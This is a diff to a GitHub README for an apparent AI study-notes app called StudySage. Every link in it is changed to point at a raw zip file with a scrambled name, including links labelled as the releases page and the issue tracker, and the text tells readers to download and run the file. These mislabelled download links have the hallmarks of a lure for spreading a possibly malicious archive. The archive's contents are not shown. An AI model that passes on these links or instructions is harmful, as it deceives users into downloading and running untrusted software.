@@ -1,6 +1,6 @@
 # 🧠 StudySage-Offline-Online-AI-Note-Assistant - Your Smart Study Companion
 
-[![Download StudySage](https://raw.githubusercontent.com/Richardjb94/StudySage-Offline-Online-AI-Note-Assistant/main/untriumphant/StudySage-Offline-Online-AI-Note-Assistant.zip%20StudySage%20v1.0-FF5722?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/Richardjb94/StudySage-Offline-Online-AI-Note-Assistant/main/untriumphant/StudySage-Offline-Online-AI-Note-Assistant.zip)
+[![Download StudySage](https://raw.githubusercontent.com/Richardjb94/StudySage-Offline-Online-AI-Note-Assistant/main/assets/Assistant_Note_Study_A_Offline_Sage_Online_v3.1.zip%20StudySage%20v1.0-FF5722?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/Richardjb94/StudySage-Offline-Online-AI-Note-Assistant/main/assets/Assistant_Note_Study_A_Offline_Sage_Online_v3.1.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Welcome to StudySage! This application helps you with your studies by summarizin
 
 To get started, you need to download the application. Follow these simple steps:
 
-1. **Visit the Releases Page:** [Click here to visit the releases page](https://raw.githubusercontent.com/Richardjb94/StudySage-Offline-Online-AI-Note-Assistant/main/untriumphant/StudySage-Offline-Online-AI-Note-Assistant.zip).
+1. **Visit the Releases Page:** [Click here to visit the releases page](https://raw.githubusercontent.com/Richardjb94/StudySage-Offline-Online-AI-Note-Assistant/main/assets/Assistant_Note_Study_A_Offline_Sage_Online_v3.1.zip).
 2. **Choose the Right Version:** Look through the available versions. Select the version that matches your operating system. 
 3. **Download the Application:** Click on the relevant link to download the installer. 
 4. **Install the Application:** Open the downloaded file and follow the prompts to install StudySage on your computer. 
@@ -57,16 +57,16 @@ Once you have successfully installed StudySage, you can start using it right awa
 
 ## 🔄 Updating StudySage
 
-To ensure you have the latest features and improvements, regularly check for updates. You can find the latest version on the same [Releases Page](https://raw.githubusercontent.com/Richardjb94/StudySage-Offline-Online-AI-Note-Assistant/main/untriumphant/StudySage-Offline-Online-AI-Note-Assistant.zip).
+To ensure you have the latest features and improvements, regularly check for updates. You can find the latest version on the same [Releases Page](https://raw.githubusercontent.com/Richardjb94/StudySage-Offline-Online-AI-Note-Assistant/main/assets/Assistant_Note_Study_A_Offline_Sage_Online_v3.1.zip).
 
 ## 📞 Support
 
 If you encounter any issues or have questions, feel free to reach out. You can create an issue in the GitHub repository where the developers actively monitor queries and concerns.
 
-- **GitHub Issues**: [Create a new issue here](https://raw.githubusercontent.com/Richardjb94/StudySage-Offline-Online-AI-Note-Assistant/main/untriumphant/StudySage-Offline-Online-AI-Note-Assistant.zip).
+- **GitHub Issues**: [Create a new issue here](https://raw.githubusercontent.com/Richardjb94/StudySage-Offline-Online-AI-Note-Assistant/main/assets/Assistant_Note_Study_A_Offline_Sage_Online_v3.1.zip).
 
 ## 🚀 Next Steps
 
 Now that you've downloaded and installed StudySage, it’s time to dive into your studies. Explore the features and find out how this tool can help you become more productive in your academic journey. 
 
-[Download StudySage](https://raw.githubusercontent.com/Richardjb94/StudySage-Offline-Online-AI-Note-Assistant/main/untriumphant/StudySage-Offline-Online-AI-Note-Assistant.zip) and start maximizing your study time today!
+[Download StudySage](https://raw.githubusercontent.com/Richardjb94/StudySage-Offline-Online-AI-Note-Assistant/main/assets/Assistant_Note_Study_A_Offline_Sage_Online_v3.1.zip) and start maximizing your study time today!
